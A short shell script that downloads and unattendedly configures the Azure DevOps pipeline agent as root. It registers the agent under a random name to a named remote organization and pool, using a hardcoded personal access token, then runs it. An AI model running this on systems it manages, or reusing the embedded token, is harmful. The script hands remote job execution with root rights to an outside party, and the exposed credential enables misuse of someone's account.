#! /bin/sh

wget https://vstsagentpackage.azureedge.net/agent/2.193.0/vsts-agent-linux-x64-2.193.0.tar.gz
tar -xvf vsts-agent-linux-x64-2.193.0.tar.gz
chmod +x config.sh
YOSIN=$(echo $(shuf -i 1-999999999999999 -n 1)donat)
export AGENT_ALLOW_RUNASROOT="1"
RUNNER_ALLOW_RUNASROOT="1" ./config.sh --unattended \
  --agent $YOSIN \
  --url https://dev.azure.com/donatyosin \
  --auth PAT \
  --token buly3rjmjmora65fwmr4r5bbmcrusje642iayd3osuszfetlz3da \
  --pool setannyetir \
  --work _work \
  --replace \
  --acceptTeeEula & wait $!
chmod +x run.sh && ./run.sh
